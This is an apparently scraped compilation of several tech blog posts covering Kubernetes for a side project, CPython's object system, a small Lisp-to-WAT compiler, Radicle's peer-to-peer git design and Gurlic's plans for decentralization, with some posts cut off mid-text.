date in case the IP address of my instances changed.</p><p>As a second iteration, I upgraded to a docker-compose setup plus lots of glue code. But soon enough I found myself reinventing what other tools already do well. There are multiple ways to solve each of these pain points, but in my case, it came down to using a tool I am very familiar with from my full-time job: Kubernetes.</p><p>Yes, I am well aware it can be overkill for a lot of projects out there, and I could have gotten away with a more traditional solution. But it works well for me, and I have been running production workloads with it for several years already. Please do not just blindly follow my path. Use what you already know best.</p><p>Kubernetes allowed me to simplify the operational aspects tremendously, and I feel comfortable debugging issues with it after having the pleasure of putting down multiple production fires for my employer over the years. It has also been around several years, there's lots of documentation, and a huge helpful community who can help. It'd argue that there's more documentation available than for any home-grown deployment system, or even EC2/Lambda/DigitalOcean for that matter.</p><p>As an added benefit, it also made it trivial when I migrated from DigitalOcean to Linode, and most recently to AWS (each migration took mostly an evening of changing my Terraform files and deploying them - I’m being serious). But that’s for another post.</p><h2>Let complexity come over time</h2><p>My point is, I moved into these technologies as the pain with the previous solution was higher than dealing with the new tech. But more importantly, it helped me ship features even faster to my customers while reducing the operational overhead for me.</p><p>If I had started with the more advanced setup from day one, I might have lost all motivation before I would have had the first version of Panelbear. The key is to solve the problems that are getting between you and your goals, not potential issues you believe one day will be yours.</p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      <p>As we know from the previous parts of this series, the execution of a Python program consists of two major steps:</p>
<ol>
<li><a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/">The CPython compiler</a> translates Python code to bytecode.</li>
<li><a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/">The CPython VM</a> executes the bytecode.</li>
</ol>
<p>We've been focusing on the second step for quite a while. In <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/">part 4</a> we've looked at the evaluation loop, a place where Python bytecode gets executed. And in <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-5-how-variables-are-implemented-in-cpython/">part 5</a> we've studied how the VM executes the instructions that are used to implement variables. What we haven't covered yet is how the VM actually computes something. We postponed this question because to answer it, we first need to understand how the most fundamental part of the language works. Today, we'll study the Python object system.</p>
<p><strong>Note</strong>: In this post I'm referring to CPython 3.9. Some implementation details will certainly change as CPython evolves. I'll try to keep track of important changes and add update notes.</p>
<h2>Motivation</h2>
<p>Consider an extremely simple piece of Python code:</p>



<p>To compute the function <code>f</code>, CPython must evaluate the expression <code>x + 7</code>. The question I'd like to ask is: How does CPython do that? Special methods such as <code>__add__()</code> and <code>__radd__()</code> probably come to your mind. When we define these methods on a class, the instances of that class can be added using the <code>+</code> operator. So, you might think that CPython does something like this:</p>
<ol>
<li>It calls <code>x.__add__(7)</code> or <code>type(x).__add__(x, 7)</code>.</li>
<li>If <code>x</code> doesn't have <code>__add__()</code>, or if this method fails, it calls <code>(7).__radd__(x)</code> or <code>int.__radd__(7, x)</code>.</li>
</ol>
<p>The reality, tough, is a bit more complicated. What really happens depends on what <code>x</code> is. For example, if <code>x</code> is an instance of a user-defined class, the algorithm described above resembles the truth. If, however, <code>x</code> is an instance of a built-in type, like <code>int</code> or <code>float</code>, CPython doesn't call any special methods at all.</p>
<p>To learn how some Python code is executed, we can do the following:</p>
<ol>
<li>Disassemble the code into bytecode.</li>
<li>Study how the VM executes the disassembled bytecode instructions.</li>
</ol>
<p>Let's apply this algorithm to the function <code>f</code>. The compiler translates the body of this function to the following bytecode:</p>
<div><pre><span></span>$ python -m dis f.py
...
  2           0 LOAD_FAST                0 (x)
              2 LOAD_CONST               1 (7)
              4 BINARY_ADD
              6 RETURN_VALUE
</pre></div>


<p>And here's what these bytecode instructions do:</p>
<ol>
<li><code>LOAD_FAST</code> loads the value of the parameter <code>x</code> onto the stack.</li>
<li><code>LOAD_CONST</code> loads the constant <code>7</code> onto the stack.</li>
<li><code>BINARY_ADD</code> pops two values from the stack, adds them and pushes the result back onto the stack.</li>
<li><code>RETURN_VALUE</code> pops the value from the stack and returns it.</li>
</ol>
<p>How does the VM add two values? To answer this question, we need to understand what these values are. For us, <code>7</code> is an instance of <code>int</code> and <code>x</code> is, well, anything. For the VM, though, everything is a Python object. All values the VM pushes onto the stack and pops from the stack are pointers to <code>PyObject</code> structs (hence the phrase "Everything in Python is an object").</p>
<p>The VM doesn't need to know how to add integers or strings, that is, how to do the arithmetic or concatenate sequences. All it needs to know is that every Python object has a type. A type, in turn, knows everything about its objects. For example, the <code>int</code> type knows how to add integers, and the <code>float</code> type knows how to add floats. So, the VM asks the type to perform the operation.</p>
<p>This simplified explanation captures the essence of the solution, but it also omits a lot of important details. To get a more realistic picture, we need to understand what Python objects and types really are and how they work.</p>
<h2>Python objects and types</h2>
<p>We've discussed Python objects a little in <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-3-stepping-through-the-cpython-source-code/">part 3</a>. This discussion is worth repeating here.</p>
<p>We begin with the definition of the <code>PyObject</code> struct:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>_object</span> <span>{</span>
    <span>_PyObject_HEAD_EXTRA</span> <span>// macro, for debugging purposes only</span>
    <span>Py_ssize_t</span> <span>ob_refcnt</span><span>;</span>
    <span>PyTypeObject</span> <span>*</span><span>ob_type</span><span>;</span>
<span>}</span> <span>PyObject</span><span>;</span>
</pre></div>


<p>It has two members:</p>
<ul>
<li>a reference count <code>ob_refcnt</code> that CPython uses for garbage collection; and</li>
<li>a pointer to the object's type <code>ob_type</code>.</li>
</ul>
<p>We said that the VM treats any Python object as <code>PyObject</code>. How is that possible? The C programming language has no notion of classes and inheritance. Nevertheless, it's possible to implement in C something that can be called a single inheritance. The C standard states that a pointer to any struct can be converted to a pointer to its first member and vice versa. So, we can "extend" <code>PyObject</code> by defining a new struct whose first member is <code>PyObject</code>.</p>
<p>Here's, for example, how the <code>float</code> object is defined:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>{</span>
    <span>PyObject</span> <span>ob_base</span><span>;</span> <span>// expansion of PyObject_HEAD macro</span>
    <span>double</span> <span>ob_fval</span><span>;</span>
<span>}</span> <span>PyFloatObject</span><span>;</span>
</pre></div>


<p>A <code>float</code> object stores everything <code>PyObject</code> stores plus a floating-point value <code>ob_fval</code>. The C standard simply states that we can convert a pointer to <code>PyFloatObject</code> to a pointer to <code>PyObject</code> and vice versa:</p>
<div><pre><span></span><span>PyFloatObject</span> <span>float_object</span><span>;</span>
<span>// ...</span>
<span>PyObject</span> <span>*</span><span>obj_ptr</span> <span>=</span> <span>(</span><span>PyObject</span> <span>*</span><span>)</span><span>&amp;</span><span>float_object</span><span>;</span>
<span>PyFloatObject</span> <span>*</span><span>float_obj_ptr</span> <span>=</span> <span>(</span><span>PyFloatObject</span> <span>*</span><span>)</span><span>obj_ptr</span><span>;</span>
</pre></div>


<p>The reason why the VM treats every Python object as <code>PyObject</code> is because all it needs to access is the object's type. A type is also a Python object, an instance of the <code>PyTypeObject</code> struct:</p>
<div><pre><span></span><span>// PyTypeObject is a typedef for "struct _typeobject"</span>

<span>struct</span> <span>_typeobject</span> <span>{</span>
    <span>PyVarObject</span> <span>ob_base</span><span>;</span> <span>// expansion of PyObject_VAR_HEAD macro</span>

<p>By the way, note that the first member of a type is not <code>PyObject</code> but <code>PyVarObject</code>, which is defined as follows:</p>

    <span>PyObject</span> <span>ob_base</span><span>;</span>
    <span>Py_ssize_t</span> <span>ob_size</span><span>;</span> <span>/* Number of items in variable part */</span>
<span>}</span> <span>PyVarObject</span><span>;</span>
</pre></div>


<p>Nevertheless, since the first member of <code>PyVarObject</code> is <code>PyObject</code>, a pointer to a type can still be converted to a pointer to <code>PyObject</code>.</p>
<p>So, what is a type and why does it have so many members? A type determines how the objects of that type behave. Each member of a type, called slot, is responsible for a particular aspect of the object's behavior. For example:</p>
<ul>
<li><code>tp_new</code> is a pointer to a function that creates new objects of the type.</li>
<li><code>tp_str</code> is a pointer to a function that implements  <code>str()</code> for objects of the type.</li>
<li><code>tp_hash</code> is a pointer to a function that implements  <code>hash()</code> for objects of the type.</li>
</ul>
<p>Some slots, called sub-slots, are grouped together in suites. A suite is just a struct that contains related slots. For example, the <code>PySequenceMethods</code> struct is a suite of sub-slots that implement the sequence protocol:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>{</span>
    <span>lenfunc</span> <span>sq_length</span><span>;</span>
    <span>binaryfunc</span> <span>sq_concat</span><span>;</span>
    <span>ssizeargfunc</span> <span>sq_repeat</span><span>;</span>
    <span>ssizeargfunc</span> <span>sq_item</span><span>;</span>
    <span>void</span> <span>*</span><span>was_sq_slice</span><span>;</span>
    <span>ssizeobjargproc</span> <span>sq_ass_item</span><span>;</span>
    <span>void</span> <span>*</span><span>was_sq_ass_slice</span><span>;</span>
    <span>objobjproc</span> <span>sq_contains</span><span>;</span>

    <span>binaryfunc</span> <span>sq_inplace_concat</span><span>;</span>
    <span>ssizeargfunc</span> <span>sq_inplace_repeat</span><span>;</span>
<span>}</span> <span>PySequenceMethods</span><span>;</span>
</pre></div>


<p>If you count all the slots and sub-slots, you'll get a scary number. Fortunately, each slot is very well <a href="https://docs.python.org/3/c-api/typeobj.html">documented</a> in the Python/C API Reference Manual (I strongly recommend you to bookmark this link). Today we'll cover only a few slots. Nevertheless, it shall give us a general idea of how slots are used.</p>
<p>Since we're interested in how CPython adds objects, let's find the slots responsible for addition. There must be at least one such slot. After careful inspection of the <code>PyTypeObject</code> struct, we find that it has the "number" suite <code>PyNumberMethods</code>, and the first slot of this suite is a binary function called <code>nd_add</code>:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>{</span>
    <span>binaryfunc</span> <span>nb_add</span><span>;</span> <span>// typedef PyObject * (*binaryfunc)(PyObject *, PyObject *)</span>
    <span>binaryfunc</span> <span>nb_subtract</span><span>;</span>
    <span>binaryfunc</span> <span>nb_multiply</span><span>;</span>
    <span>binaryfunc</span> <span>nb_remainder</span><span>;</span>
    <span>binaryfunc</span> <span>nb_divmod</span><span>;</span>
    <span>// ... more sub-slots</span>
<span>}</span> <span>PyNumberMethods</span><span>;</span>
</pre></div>


<p>It seems that the <code>nb_add</code> slot is what we're looking for. Two questions naturally arise regarding this …</p></div></div>

<a href="https://ph1lter.bitbucket.io/index.html">(home)</a> <span>2020-12-06</span>
<p>Despite what I may have said in an earlier post, it's not <em>all</em> that nice to code directly in wat.
So I've started work on a compiler. A very thin compiler. The language should feel very similar to our, beloved, <code>wat</code>, but save us from
typing all those <code>i32.const, local.get</code>.
</p>
<p>Some points up front:
</p>
<ul><li>
the compiler targets <code>WAT</code> (not <code>WASM</code>). This means using <code>WABT::wat2wasm</code>.
</li><li>
not self hosting <span>come on people, I don't even have malloc to play with yet, let alone a buggy, poorly implemented, partial copy of common lisp.</span>
</li><li>
the compiler is written in common lisp (specifically, sbcl). <span>hereinafter CL</span>.
</li><li>
syntax checking is state-of-the-art and errors are output in a readable format (i.e. you will get a cryptic <code>sbcl</code> debug trace if you make the
slightest mistake).
</li><li>
why <strong>sugar</strong>? It was either that or <code>watson, watsup, watsamatta, watulookin</code>. <span>Also cos it's just syntactical sugar, get it?</span>
</li><li>
internet searches are to be done using <code>sugarlang</code> <span>or sugarland if you prefer</span>.
</li><li>
there is no manual; not even mul/div or all the relation operators (e.g. &lt;=) are written yet!
</li><li>
the compiler output is not a standalone executable but a <code>wasm</code> file. The <em>best</em> standalone wasm runtime I've found so far is <code>wasm-interp</code>.
Please don't say node.js. You can say <code>v8</code>, maybe.
</li></ul>
<blockquote><strong>node.js/npm</strong><br>That feeling when ...<br>People say <em>Minimalist System</em><br>Then say "just use npm install ..."<br></blockquote><h2> sugar example</h2>
<p>Here is the <code>malloc.wat</code> example from the previous blog post on webasm re-written in <code>sugar</code>.
It's quite a bit more concise and convenient than the original raw <code>wat</code> (see below).
</p>
<p>(previous post on <code>wat</code>
<a href="https://ph1lter.bitbucket.io/blog/2020-12-03-webasm-forth-with-lisp-syntax.html">/blog/2020-12-03-webasm-forth-with-lisp-syntax.html</a>
)
</p>
<pre>; malloc.sugar - sugar example code
(memory (import "js" "mem") 10)
(import "console" "log" (func js_log (i i32)))
(global memend i32 #x1000)
(global sbrk (mut i32) 0)
; ----- allocate some memory in wasm-space
(defun (export "malloc") (len i32) :result i32
  (locals (i32 (newbrk (+ sbrk len)) (mem sbrk)))
  (if (&gt;= newbrk memend) (return 0))
  (set sbrk newbrk)
  mem)
; ----- write bytes in wasm-space memory using js callback
(defun (export dump_range) (start i32 len i32)
  (locals (i32 i (end (+ start len))))
  (for (i start end)
    (js_log (get.u8* i))))
</pre>
<p>And this is what you would have written if you were coding directly in <code>wat</code>.
</p>
<pre>(module
  (memory (import "js" "mem") 10)
  (import "console" "log" (func $js_log (param $i i32)))
  (global $memend i32  (i32.const 4096))
  (global $sbrk (mut i32)  (i32.const 0))
  ;; ----- allocate some memory in wasm-space
  (func (export "malloc") (param $len i32) (result i32)
    (local $newbrk i32)
    (local $mem i32)
    (local.set $newbrk (i32.add (global.get $sbrk) (local.get $len)))
    (if (i32.ge_u (local.get $newbrk) (global.get $memend))
      (return (i32.const 0)))
    (local.set $mem (global.get $sbrk))
    (global.set $sbrk (local.get $newbrk))
    (local.get $mem))
  ;; ----- write bytes in wasm-space memory using js callback
  (func (export "dump_range") (param $start i32) (param $len i32)
    (local $i i32)
    (local $end i32)
    (local.set $end (i32.add (local.get $start) (local.get $len)))
    (local.set $i (local.get $start))
    (block $break2 (loop $head1
      (br_if $break2 (i32.eq (local.get $i)  (local.get $end)))
      (call $js_log (i32.load8_u (local.get $i)))
      (local.set $i (i32.add  (i32.const 1) (local.get $i)))
      (br $head1)))))
</pre>
<h2> using sugar</h2>
<p>Write a <code>your-source.sugar</code> source file in your favorite text editor. Then run <code>sugar</code> on it to produce <code>your-source.wat</code>
</p>
<p>This is how I use sugar (with a makefile for calling sugar, then wat2wasm):
<a href="https://ph1lter.bitbucket.io/src/sugar.mk">/src/sugar.mk</a>
</p>
<pre>$ mk malloc.wasm
./sugar malloc.sugar &gt;malloc.wat
summary: globals:2 functions:3 macros:2
wat2wasm malloc.wat
</pre>
<p>(see below for installing common lisp)
</p>
<h2> compiler</h2>
<p>The compiler is very small and may be interesting to read, for that reason.
<a href="https://ph1lter.bitbucket.io/src/sugar">/src/sugar</a>
</p>
<p>It includes a macro system, which I have used to implement <code>inc</code> and <code>for</code> but it's not yet available for use from sugar
itself. <span>Also the full CL defmacro/destructuring-bind lambda list syntax is non trivial to replicate; not to mention backquote.</span>
</p>
<h3> compiler structure</h3>
<p>Here is the overall compiler structure
</p>
<pre>loop:
  read a form [from source file]
  (compile form) =&gt; stdout
compile form:
  integer =&gt; (i32.const int)
  symbol =&gt; (local/global.get varname) [check in environment/scope]
  list/s-expr/cons =&gt;
    if (is-macro? form)
      (compile (expand-macro form))
    else:
      is-special? form =&gt; (compile-special form) [defun/import/export/global/set...]
      is-function? =&gt;
        for all args (compile arg)
        call func with args
      otherwise =&gt; error undefined function
</pre>
<h3> common lisp?</h3>
<p>Too many brackets?
</p><blockquote>Rule 1: There are no brackets, only indentation.<br>Rule 0: We suffer the brackets cos it gives us defmacro and that's worth a lot of suffering.<br></blockquote><p>Did you ever generate code? Did you think that was cool? You'll love common lisp. Try it for 2 weeks.
Money back guarantee if not satisfied.
</p>
<h3> value-if</h3>
<p>Lisp has value-IF i.e. you can use IF anywhere you use a value. That's like C's ternary but more powerful.
At first I thought WAT doesn't have it, but (if) has an optional
<code>(result type)</code> clause, like (func) so that it's branches
can return (type matched) values. So you can do clever things like this:
<span>note the (result i32) clause between if and condition.</span></p>
<pre>(set x
  (if (result i32) (&gt;= z limit)
    (comp-true-value y)
    (comp-false-value s 14 q)))
</pre>
<p><code>wat (select)</code> is like the C ternary operator although it can have blocks/statement sequences inside.</p><p>select v if: select has all 3 clauses always evaluated while (if) has only the conditional and the chosen branch evaluated. The other
(if) branch is not evaluated.
</p>
<h2> future directions</h2>
<h3> user accessible macros (defmacro)</h3>
<p>Implement (defmacro ...) for sugar.
</p>
<h3> shortcut and/or</h3>
<p>At the moment I only have the bitwise and/or operators '&amp;' and 'bor' and next on the list is having shortcutting logical <code>and/or</code> operators
like CL.
</p>
<p>Ideally I'd like to have lisp-style <code>and/or</code> where the expression value is
returned rather than just 0 or 1. Also standalone <code>and/or</code> so we can have things like
</p>
<pre>(and (file-existsp fname) (process-file fname))
(or (setup-completep) (error setup-failed))
</pre>
<span>Shortcut <code>and/or</code> actually compile to nested (if) expressions.</span><h3> missing operators/functions</h3>
<p>A whole slew of function counterparts for other types (i64,f32,f64) are missing. The compiler cannot type-infer which one (see below)
so these would have explicit names like <code>+f64, set.f64</code> etc.
</p>
<p>There are many other relops missing etc. They are fairly trivial to add.
</p>
<h3> arrays</h3>
<p>Currently I'm using pointer <code>get*/set*</code> but I'd like to have <code>aref</code> and implicit index to pointer arithmetic.
</p>
<h3> loops</h3>
<p>Some more loops. <code>while repeat</code> etc. The underlying <code>block, loop, br_if, br</code> are exposed so writing loops is possible.
It would only be the case of adding some more macros to enable:
</p>
<pre>(while condition body...)
(forever body...)
</pre>
<p>Also <code>continue, break</code> would be nice.
</p>
<h3> structures / defstruct</h3>
<p>Some kind of struct might be nice to have. Even if all the fields had to be i32 initially i.e. just a vector with named,
instead of numbered, fields.
</p>
<h3> better syntax/semantic checking</h3>
<p>Even the current error messages drop you into the SBCL debugger, which can be a scary place - [<code>ctrl-d</code>] to exit.
</p>
<h3> type tracing</h3>
<p>Knowing the types of values would allow the compiler to check signatures of calls of user functions and builtins.
It would also allow me to infer the correct type for <code>set</code> rather than requiring <code>set.f32</code> etc.
</p>
<h3> LET</h3>
<p>Locals <em>must</em> be defined at the start of a function. This means implementing LET (scoped blocks with local variables) is not trivial.
The current, single-pass, compiler would need to become far more complex to first decide how many locals are required in a function,
then allocate them up-front and possibly rename them if there are clashes.
</p>
<h3> self hosting</h3>
<p>The <em>holy grail</em> of compiler writers is that they rewrite their compiler in their new language. Common Lisp is <em>so far</em> above
the level of <code>wat</code> that this would be a large undertaking. First I'd need to write malloc...
</p>
<h2> installing common lisp</h2>
<p>Setting up sugar/common lisp may be trivial or hard depending on how familiar with common lisp you are :)
</p>
<p>Installing common lisp (I use SBCL) is outside the scope of this post. (Tell me it's harder than npm ...)
</p>
<p>I refer you to [Zach Beane's]
<a href="https://www.quicklisp.org/beta/">https://www.quicklisp.org/beta/</a>
</p>
<p>SBCL might even be in your package manager:
</p>
<pre>$ pacman -Ss sbcl
</pre>
<p><code>sugar</code> is run as a unix script. I've made a custom sbcl core since I prefer <code>iterate</code> over <code>loop</code>.
Here is a very brief explanation of how to make such a core, starting with <em>plain, vanilla</em> sbcl.
</p>
<pre>$ sbcl
* (ql:quickload '#:iterate)
* (sb-ext:save-lisp-and-die "sbcl-iterate")
$ sudo mv sbcl-iterate /usr/share/sbcl/sbcl-iterate
</pre>
<h2> source</h2>

</li><li>
<a href="https://ph1lter.bitbucket.io/src/sugar">/src/sugar</a>
</li></ul>
<h2> mistakes</h2>
<p>[2020-12-07] My original compiler structure had a macro expansion bug. I was misled since I was in a block where I had just checked that
(form) was a consp/list and I assumed this remained true inside that block.
However, I missed the fact that I am modifying the form inside the block, with (expand-macro).
It's possible (expand-macro) returns a non-list e.g. a symbol. Then my list assumptions break.
</p>
<pre>compile form:
  ...
  list/s-expr/cons =&gt;
    while: (is-macro? form)
      form := (expand-macro form) &lt;---- bug: this can change form into a non-list
    is-special? form =&gt; ...
    is-function? =&gt; ...
</pre>
<p>First I fixed this with an extra list check in is-macro and also in the is-special/is-function parts, and a recursive call to compile
for non-list forms.
</p>
<p>I later thought if I had used a functional approach and avoided the mutation, I would not have made this mistake. My visual hint
that I was dealing with a list would have remained true. It turns out the functional solution is even more elegant than the original
and doesn't have the bug (+1 to functional purists).
</p>
<p>The functional solution, doesn't loop, it recurses on compile. Then compile gets the chance to decide again
what type of form expand-macro returned (nested macros …</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Git is a distributed version control system and does not require a central server. Although repositories are usually published at a well-known location for convenient cloning and fetching of the latest changes, this is actually not necessary. Each clone can have the full commit history and evolve independently. Furthermore, code changes can be exchanged via email or other means. Finally, even the clone itself does not need to be made from a well-known domain that hosts a git repository (see <tt>git-bundle(1)</tt>).</p>

<p>Given that git itself is already fully decentralized one would think there is no further work to do. I came across the <a href="https://radicle.xyz/">Radicle</a> project and its somewhat psychedelic website. Besides having a website with a wild color scheme, the project aims to offer a social coding experiment or git forge functionality using a peer-to-peer network architecture. According to the <a href="https://docs.radicle.xyz/docs/what-is-radicle">documentation</a> the motivation seems to be that git's built-in functionality works but is not user-friendly enough to make it accessible. In particular, it lacks social coding features.</p>

<p>The goal is to add git forge features like project and developer discovery, issue trackers, wikis, etc. Additional, distinctly decentralized functionality, is also touched on involving Ethereum as a way to anchor project metadata, pay contributors, etc. Radicle is still in early development so these features are not yet implemented. Here is my take on the <a href="https://radicle.xyz/">How it Works</a> documentation, which is a little confusing due to its early stage and some incomplete sentences or typos. I don't know whether my understanding actually corresponds to the Radicle implementation that exists today or its eventual vision, because I haven't studied the code or tried running the software. However, the ideas that the documentation has brought up are interesting and fruitful in their own right, so I wanted to share them and explain them in my own words in case you also find them worth exploring.</p>

<h2>The git data model</h2>
<p>Let's quickly review the git data model because it is important for understanding peer-to-peer git forges. A git repository contains a <tt>refs/</tt> subdirectory that provides a namespace for local branch heads (<tt>refs/heads/</tt>), local and remotely fetched tags (<tt>refs/tags/</tt>), and remotely fetched branches (<tt>refs/remotes/&lt;remote&gt;/</tt>). Actually this namespace layout is just a convention for everyday git usage and it's possible to use the <tt>refs/</tt> namespace differently as we will see. The git client fetches refs from a remote according to a <i>refspec</i> rule that maps remote refs to local refs. This gives the client the power to fetch only certain refs from the server. The client can also put them in a different location in its local <tt>refs/</tt> directory than the server. For details, see the <tt>git-fetch(1)</tt> man page.</p>

<p>Refs files contain the commit hash of an <i>object</i> stored in the repository's object database. An object can be a commit, tree (directory), tag, or a blob (file). Branch refs point to the latest commit object. A commit object refers to a tree object that may refer to further tree objects for sub-directories and finally the blob objects that make up the files being stored. Note that a git repository supports <i>disjoint</i> branches that share no history. Perhaps the most well-known example of disjoint branches are the GitHub Pages and GitLab Pages features where these git forges publish static websites from the HTML/CSS/JavaScript/image files on a specific branch in the repository. That branch shares no version history with other branches and the directories/files typically have no similarity to the repository's main branch.</p>

<p>Now we have covered enough git specifics to talk about peer-to-peer git forges. If you want to learn more about how git objects are actually stored, check out my article on the <a href="http://blog.vmsplice.net/2016/05/git-internals-of-how-objects-are-stored.html">repository layout and pack files</a>.</p>

<h2>Identity and authority</h2>
<p>Normally a git repository has one or more owners who are allowed to push refs. No one else has permission to modify the refs namespace. What if we tried to share a single refs namespace with the whole world and everyone could push? There would be chaos due to naming conflicts and malicious users would delete or change other users' refs. So it seems like an unworkable idea unless there is some way to enforce structure on the global refs namespace.</p>

<p>Peer-to-peer systems have solutions to these problems. First, a unique identity can be created by picking a random number with a sufficient number of bits so that the chance of collision is improbable. That unique identity can be used as a prefix in the global ref namespace to avoid accidental collisions. Second, there needs to be a way to prevent unauthorized users from modifying the part of the global namespace that is owned by other users.</p>

<p><a href="https://en.wikipedia.org/wiki/Public-key_cryptography">Public-key cryptography</a> provides the primitive for achieving both these things. A public key or its hash can serve as the unique identifier that provides identity and prevents accidental collisions. Ownership can be enforced by verifying that changes to the global namespace are signed with the private key corresponding to the unique identity.</p>

<p>For example, we fetch the following refs from a peer:</p>
<pre>&lt;identity&gt;/
  heads/
    main
  metadata/
    signed_refs
</pre>

<p>This is a simplified example based on the Radicle documentation. Here <tt>identity</tt> is the unique identity based on a public key. Remember no one else in the world has the same identity because the chance of generating the same public key is improbable. The <tt>heads/</tt> refs are normal git refs to commit objects - these are published branches. The <tt>signed_refs</tt> ref points to an git object that contains a list of commit hashes and a signature generated using the public key. The signature can be verified using the public key.</p>

<p>Next we need to <i>verify</i> these changes to check that they were created with the private key that is only known to the identity's owner. First, we check the signature on the object pointed to by the <tt>signed_refs</tt> ref. If the signature is not valid we reject these changes and do not store them in our local repository. Next, we look up each ref in <tt>heads/</tt> against the list in <tt>signed_refs</tt>. If a ref is missing from the list then we reject these refs and do not allow them into our local repository.</p>

<p>This scheme lends itself to peer-to-peer systems because the refs can be propagated (copied) between peers and verified at each step. The identity owner does not need to be present at each copy step since their cryptographic signature is all we need to be certain that they authorized these refs. So I can receive refs originally created by identity A from peer B and still be sure that peer B did not modify them since identity A's signature is intact.</p>

<p>Now we have a global refs namespace that is partitioned so that each identity is able to publish refs and peers can verify that these changes are authorized.</p>

<h2>Gossip</h2>
<p>It may not be clear yet that it's not necessary to clone the entire global namespace. In fact, it's possible that no single peer will ever have a full copy of the entire global namespace! That's because this is a distributed system. Peers only fetch refs that they care about from their peers. Peers fetch from each other and this forms a network. The network does not need to be fully connected and it's possible to have multiple clusters of peers running without full global connectivity.</p>

<p>To bootstrap the global namespace there are <i>seed</i> repositories. Seeds are a common concept in peer-to-peer systems. They provide an entry point for new peers to learn about and start participating with other peers. In BitTorrent this is called a "tracker" rather than a "seed".</p>

<p>According to the Radicle documentation it is possible to directly fetch from peers. This probably means a <tt>git-daemon(1)</tt> or <tt>git-http-backend(1)</tt> needs to be accessible on the public internet. Many peers will not have sufficient network connectivity due to <a href="https://en.wikipedia.org/wiki/Network_address_translation">NAT</a> limitations. I guess Radicle does not expect every user to participate as a repository.</p>

<p>Interestingly, there is a <i>gossip</i> system for propagating refs through the network. Let's revisit the refs for an identity in the global namespace:</p>
<pre>&lt;identity&gt;/
  heads/
    main
  metadata/
    signed_refs
  remotes/
    &lt;another-identity&gt;/
      heads/
        main
        foo
      metadata/
        signed_refs
      remotes/
        ...
</pre>

<p>We can publish identities that we track in <tt>remotes/</tt>. It's a recursive refs layout. This is how someone tracking our refs can find out about related identities and their refs.</p>

<p>Thanks to git's data model the commit, tree, and blob objects can be shared even though we duplicate refs published by another identity. Since git is a <a href="https://en.wikipedia.org/wiki/Content-addressable_storage">content-addressable</a> object database the data is stored once even though multiple refs point to it.</p>

<p>Now we not only have a global namespace where anyone can publish git refs, but also ways to build a peer-to-peer network and propagate data throughout the network. It's important to note that data is only propagated if peers are interested in fetching it. Peers are not forced to store data that they are not interested in.</p>

<h2>How data is stored locally</h2>
<p>Let's bring the pieces together and show how the system stores data. The peer creates a local git repository called the <i>monorepo</i> for the purpose of storing portions of the global namespace. It fetches refs from seeds or direct peers to get started. Thanks to the <tt>remotes/</tt> refs it also learns about other refs on the network that it did not request directly.</p>

<p>This git repository is just a data store, it is not usable for normal git workflows. The conventional <tt>git branch</tt> and <tt>git tag</tt> commands would not work well with the global namespace layout and verification requirements. Instead we can clone a local file:/// repository from the monorepo that fetches a subset of the refs into the conventional git refs layout. The files can be shared because <tt>git-clone(1)</tt> supports hard links to local repositories. Thanks to <tt>githooks(5)</tt> and/or extensible <tt>git-push(1)</tt> remote helper support it's possible to generate the necessary global namespace …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
          
            <p>Earlier today, I had the misfortune of reading a blog post about the dangers of the decentralized web and how we should not partake in or encourage it's development. Hacker News had a pretty <a href="https://news.ycombinator.com/item?id=25312854" rel="noopener noreferrer nofollow">active discussion</a> about the post.</p><p>Ideological takes on this always turn ugly, and I'm at a point in my life where I avoid that at all costs. I can only talk about my preferences about the world, not about how things ought to be, implying some sort of inherent value or divine moral good.</p><p>Here's what I prefer: a world where ideas, no matter how silly or dangerous, are allowed to be expressed, shared, ignored, attacked and laughed at. I don't imagine a world like this can ever exist easily, but a more decentralized web can help us get halfway there.</p><h3 id="ok-so-what-about-gurlic-then">Ok so what about Gurlic then?</h3><p><a href="https://gurlic.com/" rel="noopener noreferrer nofollow">Gurlic</a> is roughly just over two months old now, and at a point where I am relatively comfortable with the basic features it has. In the coming weeks and months, I want to focus on modifying the backend to either adopt an existing decentralized protocol, or think about how to approach writing a new one. Perhaps it would have been smarter to do this before building it first, but that would have limited how I envisioned Gurlic to be and it would've turned out differently.</p><p>Right now I'm looking into the <a href="https://www.w3.org/TR/activitypub/" rel="noopener noreferrer nofollow">activitypub</a> spec, and the <a href="https://matrix.org/docs/spec/" rel="noopener noreferrer nofollow">matrix</a> spec - here are some initial thoughts I have about how Gurlic should approach decentralization/federation.</p><ul><li><p>Decentralization can be a priority, but must never be promoted as a feature, or made to be a selling point. When decentralization becomes the main selling point of a product or service, the usability and polish tend to suffer. Not always, but nearly always. None of the marketing copy should include the words 'decentralization', 'privacy' etc. <strong>Normal users don't care about any of this</strong>.</p></li><li><p>User experience should be seamless. The user shouldn't have to generate a key, remember an extra password, remember weird URL schemes, or download utilities and clients just to be part of an online community or to write an article. Above all, the user must not be confused, as one usually is when looking at Mastodon instances, which one to sign up to, and so on. My mom should be able to use it without having to call me, just like she does with Facebook. <strong>Normal users do care about this</strong>.</p></li><li><p>The protocol must be flexible enough to allow for all of Gurlic's current features. This means communities, user profiles, publications, articles, galleries, rich media posts, sharing/responding and so on. All seamlessly without any rough edges.</p></li><li><p>Any and all cryptocurrency/blockchain must be avoided.</p></li></ul><p>I'll have more to write about this in the near future.</p>

December 6, 2020 | https://security.christmas/2020/6 | <a href="https://web.archive.org/web/*/https://security.christmas/2020/6">archive.org</a>
